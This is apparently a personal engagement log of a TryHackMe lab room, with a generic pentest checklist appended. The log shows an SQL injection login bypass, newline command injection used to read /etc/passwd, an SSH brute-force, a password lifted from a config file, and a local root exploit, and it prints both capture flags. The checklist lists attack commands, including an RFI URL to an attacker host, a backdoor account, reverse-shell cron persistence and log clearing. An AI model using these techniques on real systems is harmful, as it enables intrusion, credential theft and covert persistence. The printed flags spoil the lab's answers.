# THM_Silent Monitor Take 2

## Engagement Target

| Field | Value |
| --- | --- |
| Engagement | THM_Silent Monitor Take 2 |
| Target IP | 10.145.176.60 |
| System |  |
| Credentials | `S3cur3Backup$Acc3ss!` |
| URL / host | 10.145.176.60:5050/internal |
| Scope |  |
| Export date | May 29, 2026 |
| Progress | 12 / 99 tasks completed |

## Notes

---
### `[05/29/26 09:19:42]`
  #### *Reconnaissance · Active recon · Port scanning (top 1000)*
  ```
  ┌──(kali㉿kali)-[/etc]
  └─$ nmap 10.145.176.60     
  Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-29 09:18 -0700
  Nmap scan report for 10.145.176.60
  Host is up (0.066s latency).
  Not shown: 998 closed tcp ports (reset)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  5050/tcp open  mmcc
  ```

---
### `[05/29/26 09:20:10]`
  #### *Engagement log*
  Starting this room again. We will get farther this time

---
### `[05/29/26 09:21:10]`
  #### *Reconnaissance · Active recon · Service / version fingerprinting*
  ```
  ┌──(kali㉿kali)-[/etc]
  └─$ nmap 10.145.176.60 -sV                    
  Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-29 09:20 -0700
  Nmap scan report for 10.145.176.60
  Host is up (0.071s latency).
  Not shown: 998 closed tcp ports (reset)
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
  5050/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

---
### `[05/29/26 09:22:09]`
  #### *Reconnaissance · Active recon · Web technology fingerprinting*
  ```
  ┌──(kali㉿kali)-[/etc]
  └─$ whatweb -a 3 http://10.145.176.60:5050/        
  http://10.145.176.60:5050/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.10.12], IP[10.145.176.60], Python[3.10.12], Title[CorpNet — Network Operations Centre], Werkzeug[2.0.2]
  ```

---
### `[05/29/26 09:22:22]`
  #### *Enumeration · Web application · Inspector*
  No results

---
### `[05/29/26 09:22:42]`
  #### *Enumeration · Web application · Directory & file brute-force*
  The important domain is 
  ```
  /internal
  ```

---
### `[05/29/26 09:22:51]`
  #### *Enumeration · Web application · Robots.txt & sitemap.xml review*
  No results

---
### `[05/29/26 09:23:03]`
  #### *Enumeration · Web application · Check for default credentials*
  No results

---
### `[05/29/26 09:25:44]` 📌
  #### *Vulnerability scanning · Manual web testing · SQL injection (SQLi)*
  Here is where I Went wrong on my previous attempt to this room. I swear I tried an injection on the login, but I was unsuccessful. However, there is no note of it so who knows..
  
  It turns out that a simple injection DOES work
  ```
  abc' OR 1=1;-- -
  ```
  and we have access! 
  
  http://10.145.176.60:5050/internal/dashboard

---
### `[05/29/26 09:31:29]`
  #### *Engagement log*
  A few things look potentially interesting right away. 
  I see a detail of ```127.0.0.1%0awhoami``` from username ```netops```
  There's a username ```jmartin```
  Also a username ```' OR 1=1#```
  and one more ```admin' --```

---
### `[05/29/26 09:34:51]`
  #### *Engagement log*
  There is a Host Health tab where it looks like I can run commands. I'll try the same command I found in the logs. ```127.0.0.1%0awhoami```

---
### `[05/29/26 09:38:45]`
  #### *Engagement log*
  The copied whoami command did not work, However, there are some hints on the same page.
  ```
  
  Sends 2 ICMP echo requests with a 1-second per-packet timeout
  Accepts RFC-952 compliant hostnames and dotted-decimal IPv4 addresses
  All probe targets are recorded in the operator audit log
  ICMP traffic may be filtered by host-based firewalls on monitored nodes
  ```

---
### `[05/29/26 09:46:19]`
  #### *Engagement log*
  Not really getting anywhere, I wondered if I could get further with Burp. I intercepted a Host Health request and forwarded it to the repeater

---
### `[05/29/26 09:47:05]`
  #### *Engagement log*
  In repeater, I changed ```target=localhost``` to ```target=localhost%0awhoami```

---
### `[05/29/26 09:49:04]`
  #### *Engagement log*
  On lines 225 - 240 in the response, I can see that both commands are run, even though it does not show the same response on the Host Health probe.
  ```
         <div class="output-block">
            <div class="output-bar">
              <span class="cmd">$ ping -c 2 -W 1 localhost
  whoami</span>
              <span class="lbl">stdout</span>
            </div>
            <pre class="output-pre">PING localhost (127.0.0.1) 56(84) bytes of data.
  64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.021 ms
  64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.032 ms
  
  --- localhost ping statistics ---
  2 packets transmitted, 2 received, 0% packet loss, time 1032ms
  rtt min/avg/max/mdev = 0.021/0.026/0.032/0.005 ms
  www-data
  </pre>
  ```

---
### `[05/29/26 09:50:18]`
  #### *Engagement log*
  To clarify, the local host is logged in as ```www-data```

---
### `[05/29/26 09:51:49]`
  #### *Engagement log*
  ```id``` returns the info
  ```
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

---
### `[05/29/26 09:52:51]`
  #### *Engagement log*
  ```cat /etc/passwd``` returns
  ```
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
  systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
  messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
  syslog:x:104:110::/home/syslog:/usr/sbin/nologin
  _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
  tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
  uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
  tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
  sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
  landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
  pollinate:x:111:1::/var/cache/pollinate:/bin/false
  ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
  systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
  ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
  lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
  fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
  sysadmin:x:1001:1001::/home/sysadmin:/bin/bash
  ```

---
### `[05/29/26 09:53:03]`
  #### *Engagement log*
  Now, we're getting somewhere!

---
### `[05/29/26 09:54:10]`
  #### *Engagement log*
  I tried to get a simplified readout by adding ```| grep home```
  that did not work

---
### `[05/29/26 09:55:31]`
  #### *Engagement log*
  Useful usernames from this list seem to be
  ```
  root
  ubuntu
  sysadmin
  ```

---
### `[05/29/26 09:58:08]`
  #### *Engagement log*
  Unfortunately I don't have access to /etc/shadow from here
  Request = ```target=localhost%0acat /etc/shadow```
  Response - ```cat: /etc/shadow: Permission denied```

---
### `[05/29/26 10:05:09]`
  #### *Engagement log*
  Searching for the user.txt, I found it but it's unreadable. 
  Request ```target=localhost%0acat /home/sysadmin/user.txt```
  Response ```cat: /home/sysadmin/user.txt: Permission denied```

---
### `[05/29/26 10:05:44]` 📌
  #### *Engagement log*
  user.txt is in
  ```/home/sysadmin/user.txt```

---
### `[05/29/26 10:07:07]`
  #### *Engagement log*
  Now that I have a username, I'll run hydra against ```sysadmin```
  ```
  hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://10.145.176.60
  ```

---
### `[05/29/26 10:08:05]`
  #### *Exploitation · Credential attacks · Brute-force SSH / FTP / RDP*
  hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ssh://10.145.176.60

---
### `[05/29/26 10:19:54]`
  #### *Engagement log*
  Enumerating the computer directories, I've learned there is nothing in 
  ```/home/ubuntu```
  
  ```/home/sysadmin``` is locked down and inaccessible from www-data
  
  The root directory is as follows
  ```
  bin
  boot
  core
  dev
  etc
  home
  lib
  lib32
  lib64
  libx32
  lost+found
  media
  mnt
  opt
  proc
  root
  run
  sbin
  snap
  srv
  sys
  tmp
  usr
  var
  ```

---
### `[05/29/26 10:21:07]`
  #### *Engagement log*
  ```
  /usr
  bin
  games
  include
  lib
  lib32
  lib64
  libexec
  libx32
  local
  sbin
  share
  src
  ```

---
### `[05/29/26 10:21:49]`
  #### *Engagement log*
  ```
  /var
  backups
  cache
  crash
  lib
  local
  lock
  log
  mail
  opt
  run
  snap
  spool
  tmp
  ```

---
### `[05/29/26 10:24:39]`
  #### *Engagement log*
  A simple ```pwd``` earlier showed me I was in the ```/opt/netops``` directory. I didn't think to see what was in the directory at the time. But there is something interesting here. 
  ```
  app.py
  netops.db
  secret.config
  templates
  ```

---
### `[05/29/26 10:26:27]`
  #### *Engagement log*
  Alright, this looks good. The contents of ```secret.config``` contain creds!
  ```
  # netops application config
  # generated: 2026-01-03
  
  [database]
  path    = /opt/netops/netops.db
  timeout = 5
  
  [app]
  host     = 0.0.0.0
  port     = 5050
  log_path = /var/log/netops/app.log
  
  [auth]
  session_lifetime = 1800
  
  # service account used by the backup agent
  # TODO: migrate to secrets manager before Q2 audit
  [backup_agent]
  run_as   = sysadmin
  password = S3cur3Backup$Acc3ss!
  
  [smtp]
  host = 127.0.0.1
  port = 25
  from = noc-alerts@corp.internal
  ```

---
### `[05/29/26 10:26:52]`
  #### *Engagement log*
  I suppose I can now stop hydra..

---
### `[05/29/26 10:27:15]`
  #### *Exploitation · Credential attacks · Brute-force SSH / FTP / RDP*
  No results w/ hydra

---
### `[05/29/26 10:28:20]`
  #### *Post-exploitation · Local privesc · Password in files / env vars*
  Found in the secret.config file
  ```
  run_as   = sysadmin
  password = S3cur3Backup$Acc3ss!
  ```

---
### `[05/29/26 10:32:16]`
  #### *Engagement log*
  Finally!!!
  ```
  ┌──(kali㉿kali)-[~]
  └─$ ssh sysadmin@10.145.176.60
  sysadmin@10.145.176.60's password: 
  Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1017-aws x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/pro
  
   System information as of Fri May 29 17:31:38 UTC 2026
  
    System load:  0.45               Processes:             106
    Usage of /:   15.6% of 19.31GB   Users logged in:       0
    Memory usage: 55%                IPv4 address for ens5: 10.145.176.60
    Swap usage:   0%
  
   * Ubuntu Pro delivers the most comprehensive open source security and
     compliance features.
  
     https://ubuntu.com/aws/pro
  
  Expanded Security Maintenance for Applications is not enabled.
  
  213 updates can be applied immediately.
  152 of these updates are standard security updates.
  To see these additional updates run: apt list --upgradable
  
  Enable ESM Apps to receive additional future security updates.
  See https://ubuntu.com/esm or run: sudo pro status
  
  
  The list of available updates is more than a week old.
  To check for new updates run: sudo apt update
  
  Last login: Tue May 19 03:18:19 2026 from 192.168.230.214
  sysadmin@tryhackme-2204:~$ 
  ```

---
### `[05/29/26 10:34:44]`
  #### *Post-exploitation · Local privesc · SUID / SGID binary abuse*
  SUID
  ```
  /usr/bin/chfn
  /usr/bin/pkexec
  /usr/bin/sudo
  /usr/bin/umount
  /usr/bin/passwd
  /usr/bin/gpasswd
  /usr/bin/newgrp
  /usr/bin/chsh
  /usr/bin/fusermount3
  /usr/bin/su
  /usr/bin/mount
  ```

---
### `[05/29/26 10:37:04]`
  #### *Post-exploitation · Local privesc · Sudo misconfigurations*
  No results

---
### `[05/29/26 10:37:35]`
  #### *Engagement log*
  I guess the first thing I should do is get the first flag..

---
### `[05/29/26 10:38:40]`
  #### *Engagement log*
  As I found before, the flag is in the users home directory
  ```
  sysadmin@tryhackme-2204:~$ pwd
  /home/sysadmin
  sysadmin@tryhackme-2204:~$ ls
  backups  user.txt
  sysadmin@tryhackme-2204:~$ cat user.txt 
  THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
  ```

---
### `[05/29/26 10:39:02]`
  #### *Engagement log*
  Now I just need to find a way to priv esc to root

---
### `[05/29/26 10:40:14]`
  #### *Post-exploitation · Local privesc · SUID / SGID binary abuse*
  Nothing usable

---
### `[05/29/26 10:41:33]`
  #### *Post-exploitation · Local privesc · Cron job / scheduled task abuse*
  No results

---
### `[05/29/26 10:42:14]`
  #### *Post-exploitation · Local privesc · Kernel exploit*
  ```
  sysadmin@tryhackme-2204:~$ uname -a
  Linux tryhackme-2204 6.8.0-1017-aws #18~22.04.1-Ubuntu SMP Thu Oct  3 19:57:42 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
  ```

---
### `[05/29/26 10:50:09]`
  #### *Engagement log*
  I'm not sure why I was trying to make this hard on myself and not use linpeas.
  
  I copied linpeas over with
  ```
  scp linpeas.sh sysadmin@10.145.176.60:/tmp
  ```

---
### `[05/29/26 10:50:58]`
  #### *Engagement log*
  made sure to ```chmod 777 linpeas.sh``` then ran it with ```./linpeas.sh```

---
### `[05/29/26 10:58:13]`
  #### *Engagement log*
  I saw this file wile linpeas was running, noting it to check it out.
  ```
  /usr/bin/gettext.sh
  ```

---
### `[05/29/26 11:03:02]`
  #### *Engagement log*
  sudo pkexec /bin/sh was another linpeas find, no sudo abilities though.

---
### `[05/29/26 11:03:40]`
  #### *Engagement log*
  CVE-2021-4034 might be interesting, this is another find from linpeas. There's an exploit in metasploit so I'll explore that.

---
### `[05/29/26 11:11:23]`
  #### *Engagement log*
  I'm trying something I've never done. I've created a SSH session in metasploit, then I'll try and use that session for priv esc with CVE-2021-4034

---
### `[05/29/26 11:13:06]`
  #### *Engagement log*
  dangit..
  ```
  msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
  [*] Started reverse TCP handler on 192.168.137.113:4444 
  [*] Running automatic check ("set AutoCheck false" to disable)
  [!] Verify cleanup of /tmp/.nuvcwb
  [-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The target does not appear vulnerable "set ForceExploit true" to override check result.
  [*] Exploit completed, but no session was created.
  ```

---
### `[05/29/26 11:19:24]`
  #### *Engagement log*
  Ok, I'm tired of hitting brick walls with this room. I loaded in the CopyFail python script and was able to gain root access and find the flag.
  ```
  sysadmin@tryhackme-2204:/usr/bin$ nano cf.py
  sysadmin@tryhackme-2204:/usr/bin$ nano /tmp/cf.py
  sysadmin@tryhackme-2204:/usr/bin$ cd /tmp
  sysadmin@tryhackme-2204:/tmp$ ls
  cf.py
  cf31-probe-3596.py
  linpeas.sh
  snap-private-tmp
  systemd-private-1d0b0fd2c3094587a84675457c677815-ModemManager.service-bFqzi6
  systemd-private-1d0b0fd2c3094587a84675457c677815-systemd-logind.service-xEXzyD
  systemd-private-1d0b0fd2c3094587a84675457c677815-systemd-resolved.service-0VkNzw
  systemd-private-1d0b0fd2c3094587a84675457c677815-systemd-timesyncd.service-mfXrR3
  tmux-1001
  sysadmin@tryhackme-2204:/tmp$ python3 cf.py
  # id
  uid=0(root) gid=1001(sysadmin) groups=1001(sysadmin)
  # cd /root
  # ls
  root.txt  snap
  # cat root.txt
  THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
  ```

---
### `[05/29/26 11:20:50]`
  #### *Engagement log*
  However, I want to see if I can reverse engineer this flag and get to it the right way. I looks like it is referencing a KDBX Vault. I'll exit out of the root shell and see if I can find a KDBX file somewhere.

---
### `[05/29/26 11:22:28]`
  #### *Engagement log*
  I found one hidden in the backup folder.
  ```
  sysadmin@tryhackme-2204:/tmp$ find / -name *.kdbx 2>/dev/null
  /home/sysadmin/backups/infrastructure.kdbx
  ```

---
### `[05/29/26 11:23:42]`
  #### *Engagement log*
  The README file suggests that this is a KeePass file, creds!!
  ```
  sysadmin@tryhackme-2204:~/backups$ cat README.txt 
  Backup archive — infrastructure credentials
  
  Periodic exports from the credential store are placed here by the backup agent.
  Treat all files in this directory as CONFIDENTIAL.
  
  infrastructure.kdbx — KeePass credential database
  
  Contact the sysadmin team lead if you require access.
  ```

---
### `[05/29/26 11:24:58]`
  #### *Engagement log*
  ```cat infrastructure.kdbx``` returns gibberish. I ran across this recently somewhere. I think I have to decode it somehow.

---
### `[05/29/26 11:33:45]`
  #### *Engagement log*
  I'm not sure. Scanning google, it looks like I need KeePass to open the file. It is not on the VM, and I've spent too much time in this room already. I found both flags, so I'm good with that. I'm calling it done.

---

## 1. Reconnaissance
*Passive & active information gathering before touching the target.*

### Passive OSINT

- [N/A] **WHOIS / DNS records lookup** — INFO
  - `whois, dig, host, dnsx`
- [N/A] **Subdomain enumeration (passive)** — INFO
  - `subfinder, amass passive, crt.sh, dnsdumpster`
- [N/A] **Google dorks & Shodan searches** — MED
  - `site:, filetype:, inurl: — check Shodan for exposed services`
- [N/A] **Email harvesting** — INFO
  - `theHarvester, hunter.io, LinkedIn enumeration`
- [N/A] **GitHub/GitLab code leaks** — HIGH
  - `truffleHog, gitleaks, dork: org:<name> password OR secret`
- [N/A] **Wayback Machine / archive.org** — MED
  - `Look for old endpoints, hidden params, old login pages`
- [N/A] **Certificate transparency logs** — INFO
  - `crt.sh, censys.io — reveals subdomains from TLS certs`
- [N/A] **ASN / IP range enumeration** — INFO
  - `bgp.he.net, whois -h whois.radb.net -- -i origin AS####`

### Active recon

- [x] **Port scanning (top 1000)** — INFO *(1 note)*
  - `nmap -sV -sC -T4 --top-ports 1000`
- [N/A] **Full port scan (1-65535)** — INFO
  - `nmap -p- --min-rate 5000 or rustscan`
- [x] **Service / version fingerprinting** — INFO *(1 note)*
  - `nmap -sV -O + banner grabbing with nc/curl`
- [N/A] **Active subdomain brute-force** — INFO
  - `ffuf, gobuster dns, amass enum -active`
- [N/A] **DNS zone transfer attempt** — HIGH
  - `dig axfr @nameserver target.com`
- [x] **Web technology fingerprinting** — INFO *(1 note)*
  - `whatweb, wappalyzer, retire.js, builtwith`

## 2. Enumeration
*Deep-dive each service to map the real attack surface.*

### Web application

- [x] **Inspector** — INFO *(1 note)*
  - `Anything interesting in here? Dev notes? Files?`
- [x] **Directory & file brute-force** — INFO *(1 note)*
  - `ffuf -w common.txt -u URL/FUZZ, gobuster dir`
- [N/A] **Subdomain & virtual host discovery** — MED
  - `ffuf -H "Host: FUZZ.target.com" + wordlist`
- [x] **Robots.txt & sitemap.xml review** — INFO *(1 note)*
  - `Hidden paths, admin panels, disallowed dirs`
- [N/A] **JavaScript file analysis** — HIGH
  - `LinkFinder, SecretFinder — APIs, tokens, endpoints`
- [N/A] **Parameter discovery** — MED
  - `arjun, x8 — find hidden GET/POST parameters`
- [N/A] **API endpoint enumeration** — MED
  - `Check swagger.json, api-docs, postman collections`
- [x] **Check for default credentials** — HIGH *(1 note)*
  - `admin/admin, admin/password on web panels`

### Network services

- [N/A] **SMB enumeration (445)** — HIGH
  - `enum4linux-ng, smbclient -L, crackmapexec smb`
- [N/A] **LDAP enumeration (389/636)** — HIGH
  - `ldapsearch -x -b "" -H ldap://target`
- [N/A] **RPC enumeration (135)** — MED
  - `rpcclient -U "" -N, impacket-rpcdump`
- [N/A] **SNMP enumeration (161 UDP)** — MED
  - `snmpwalk -v2c -c public, onesixtyone`
- [N/A] **NFS shares enumeration** — HIGH
  - `showmount -e target — check for world-readable mounts`
- [N/A] **SMTP user enumeration (25)** — MED
  - `VRFY, EXPN, RCPT TO commands`
- [N/A] **FTP anonymous login check** — HIGH
  - `ftp target — user: anonymous, pass: anything`
- [N/A] **Database ports (1433, 3306, 5432)** — HIGH
  - `Unauthenticated access, version banner`

## 3. Vulnerability scanning
*Systematic scanning and manual validation of discovered weaknesses.*

### Automated scanning

- [N/A] **Nessus / OpenVAS full scan** — INFO
  - `Run credentialed scan if possible — far more findings`
- [N/A] **Nikto web server scan** — INFO
  - `nikto -h https://target -ssl`
- [N/A] **Nuclei template scan** — INFO
  - `nuclei -u target -t cves/ -t exposures/ -t misconfigs/`
- [N/A] **SSL / TLS misconfiguration check** — MED
  - `testssl.sh, sslscan — weak ciphers, BEAST, POODLE`
- [N/A] **HTTP security headers audit** — LOW
  - `securityheaders.com, missing CSP/HSTS/X-Frame-Options`

### Manual web testing

- [x] **SQL injection (SQLi)** — HIGH *(1 note)*
  - `sqlmap -u URL --dbs; manual: single quote, ORDER BY`
- [ ] **Cross-site scripting (XSS)** — HIGH
  - `Reflected, Stored, DOM — test all input fields & params`
- [ ] **Server-side request forgery (SSRF)** — HIGH
  - `Burp Collaborator, internal IPs, AWS metadata 169.254.169.254`
- [ ] **Local / remote file inclusion** — HIGH
  - `LFI: ../../etc/passwd ; RFI: http://attacker/shell.php`
- [ ] **Command injection** — HIGH
  - `Semicolons, pipes, backticks in user input fields`
- [ ] **Insecure direct object reference (IDOR)** — HIGH
  - `Manipulate IDs in API calls — access other users’ data`
- [ ] **Broken authentication & session mgmt** — HIGH
  - `Weak tokens, predictable session IDs, no lockout`
- [ ] **XML external entity (XXE)** — HIGH
  - `Inject XXE in XML inputs, SOAP endpoints, file uploads`
- [ ] **Insecure file upload** — HIGH
  - `Upload PHP/ASPX shell — bypass MIME checks, double ext`
- [ ] **Deserialization vulnerabilities** — HIGH
  - `Java/.NET serialized objects, ysoserial gadgets`
- [ ] **CORS misconfiguration** — MED
  - `Burp — Origin: https://evil.com — check Access-Control-Allow`
- [ ] **Open redirect** — LOW
  - `redirect= param to phishing page, can chain with OAuth`

## 4. Exploitation
*Gaining initial access — foothold on the target system.*

### Credential attacks

- [N/A] **Password spraying (web / AD)** — HIGH
  - `crackmapexec, spray.sh — 1 password per account to avoid lockout`
- [x] **Brute-force SSH / FTP / RDP** — HIGH *(2 notes)*
  - `hydra -L users.txt -P passwords.txt ssh://target`
- [N/A] **Kerberoasting (AD)** — HIGH
  - `impacket-GetUserSPNs, then hashcat -m 13100`
- [N/A] **AS-REP roasting (AD)** — HIGH
  - `GetNPUsers.py — accounts with no pre-auth required`
- [N/A] **LLMNR / NBT-NS poisoning** — HIGH
  - `Responder -I eth0 — capture NTLMv2 hashes on LAN`
- [N/A] **Pass-the-Hash (PTH)** — HIGH
  - `crackmapexec smb -H <NTLM_hash>, impacket-psexec`

### Service exploitation

- [ ] **Metasploit Framework** — HIGH
  - `msfconsole — search, use, set RHOSTS / LHOST, run / exploit`
- [N/A] **EternalBlue / MS17-010 check** — HIGH
  - `nmap --script smb-vuln-ms17-010; ms17_010_eternalblue`
- [N/A] **PrintNightmare (CVE-2021-1675)** — HIGH
  - `rpcdump check for print spooler, cube0x0 PoC`
- [N/A] **Log4Shell (CVE-2021-44228)** — HIGH
  - `Inject jndi payload in User-Agent, X-Forwarded-For`
- [N/A] **Exploit CVEs from version scan** — HIGH
  - `searchsploit <service version>; check ExploitDB, GitHub PoC`
- [N/A] **Web shell upload / RCE chain** — HIGH
  - `Upload → trigger → reverse shell via nc/msfvenom payload`
- [N/A] **Shellshock (CVE-2014-6271)** — HIGH
  - `Inject into User-Agent header via curl`

### Phishing / client-side

- [N/A] **Spear phishing email with payload** — HIGH
  - `GoPhish + macro doc / HTA / LNK payload`
- [N/A] **Browser-in-the-Browser (BitB)** — HIGH
  - `Fake OAuth window to steal creds`
- [N/A] **Malicious USB drop (if in scope)** — HIGH
  - `Rubber Ducky, Bash Bunny payloads`

## 5. Post-exploitation
*Privilege escalation, lateral movement, and persistence after foothold.*

### Local privesc

- [ ] **Run privesc enumeration scripts** — INFO
  - `LinPEAS / WinPEAS — always start here`
- [x] **SUID / SGID binary abuse** — HIGH *(2 notes)*
  - `find / -perm -4000 2>/dev/null; check GTFOBins`
- [x] **Sudo misconfigurations** — HIGH *(1 note)*
  - `sudo -l; check sudoers for NOPASSWD entries`
- [x] **Cron job / scheduled task abuse** — HIGH *(1 note)*
  - `Writable scripts run as root; cat /etc/crontab`
- [ ] **Kernel exploit** — HIGH *(1 note)*
  - `uname -r → searchsploit; Windows: systeminfo + wesng`
- [ ] **Unquoted service paths** — HIGH
  - `wmic service get name,pathname — look for spaces without quotes`
- [ ] **AlwaysInstallElevated** — HIGH
  - `reg query HKLM/HKCU ...AlwaysInstallElevated — if 1, game over`
- [ ] **Token impersonation** — HIGH
  - `JuicyPotato, PrintSpoofer, RoguePotato — SeImpersonatePrivilege`
- [ ] **Password in files / env vars** — HIGH *(1 note)*
  - `grep -r password /etc, env, ~/.bash_history, web.config`

### Lateral movement & AD attacks

- [ ] **BloodHound / SharpHound collection** — HIGH
  - `Map AD attack paths — look for shortest path to DA`
- [ ] **Pass-the-Ticket (PTT)** — HIGH
  - `Rubeus, impacket — use TGT/TGS to move laterally`
- [ ] **DCSync attack** — HIGH
  - `impacket-secretsdump — if user has DS-Replication rights`
- [ ] **Golden / Silver Ticket** — HIGH
  - `Forge Kerberos tickets with KRBTGT hash — persistent DA`
- [ ] **ACL abuse (GenericAll, WriteDACL)** — HIGH
  - `BloodHound edges → PowerView targeted escalation`
- [ ] **WMI / PsExec lateral movement** — HIGH
  - `crackmapexec, impacket-wmiexec, wmiexec.py`

### Persistence

- [ ] **Add SSH authorized_keys** — MED
  - `echo pubkey >> ~/.ssh/authorized_keys`
- [ ] **Create backdoor user account** — HIGH
  - `useradd -m -s /bin/bash -G sudo backdoor`
- [ ] **Cron reverse-shell persistence** — MED
  - `*/5 * * * * reverse shell one-liner — crontab -e`
- [ ] **Registry run key** — MED
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- [ ] **Web shell in web root** — MED
  - `Upload small ASPX/PHP shell for re-entry`

## 6. Exfiltration & reporting
*Data access, cleanup, and compiling the final report.*

### Data access & evidence

- [ ] **Screenshot domain admin proof** — INFO
  - `ipconfig /all + hostname + whoami on DC`
- [ ] **Dump credential stores** — HIGH
  - `secretsdump, mimikatz lsadump::lsa — document all hashes found`
- [ ] **Access sensitive files / data** — HIGH
  - `HR, PII, IP, financial — document, do not exfil unless in scope`
- [ ] **Database dump (scoped tables)** — HIGH
  - `mysqldump, sqlcmd, pg_dump — confirm scope before extracting`
- [ ] **Email access evidence** — MED
  - `OWA / Exchange access — screenshot inbox of C-suite`

### Cleanup

- [ ] **Remove all created user accounts** — HIGH
  - `userdel, net user /delete — confirm removed`
- [ ] **Delete uploaded shells & payloads** — HIGH
  - `rm all web shells, msfvenom payloads, staged files`
- [ ] **Clear relevant log entries** — MED
  - `Clear Event Log, auth.log — coordinate with client`
- [ ] **Remove persistence mechanisms** — HIGH
  - `Uninstall cron jobs, registry keys, services you created`
- [ ] **Restore changed configurations** — HIGH
  - `Revert any service configs or file permissions changed`

### Reporting

- [ ] **Document full kill chain narrative** — INFO
  - `Initial access → lateral movement → DA — readable story`
- [ ] **CVSS score all findings** — INFO
  - `NVD CVSS calculator — Critical / High / Medium / Low / Info`
- [ ] **Write executive summary** — INFO
  - `Non-technical, business risk focused, 1–2 pages max`
- [ ] **Write technical findings** — INFO
  - `PoC steps, screenshots, affected hosts, remediation`
- [ ] **Include remediation roadmap** — INFO
  - `Prioritized fix list with effort estimates`
- [ ] **Debrief call with client** — INFO
  - `Walk findings, answer questions, set re-test timeline`
